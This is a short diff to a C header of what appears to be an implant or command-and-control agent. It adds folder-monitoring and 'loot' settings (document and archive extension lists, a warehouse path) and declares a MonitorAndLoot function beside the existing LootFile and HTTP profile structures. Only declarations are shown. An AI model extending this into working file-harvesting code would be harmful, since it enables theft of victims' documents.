@@ -74,11 +74,15 @@ struct _GLOBAL_CONFIG {
 	HANDLE hCurrentToken;
 
 	// Loot file
+	BOOL Loot;
 	LPWSTR* DocumentExtensions;
 	DWORD cDocumentExtensions;
 	LPWSTR* ArchiveExtensions;
 	DWORD cArchiveExtensions;
+	LPWSTR* MonitoredFolder;
+	DWORD dwNumberOfMonitoredFolder;
 	WCHAR wszWarehouse[MAX_PATH];
+	BOOL StoppingMonitor;
 
 	PHTTP_PROFILE* HttpProfiles;
 	DWORD cHttpProfiles;
@@ -275,6 +279,11 @@ VOID FreePivotProfile
 );
 
 VOID LootFile
+(
+	_In_ PGLOBAL_CONFIG pConfig
+);
+
+VOID MonitorAndLoot
 (
 	_In_ PGLOBAL_CONFIG pConfig
 );
